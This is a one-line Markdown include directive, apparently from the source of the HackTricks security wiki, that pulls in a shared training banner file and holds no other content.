{{#include ../banners/hacktricks-training.md}}
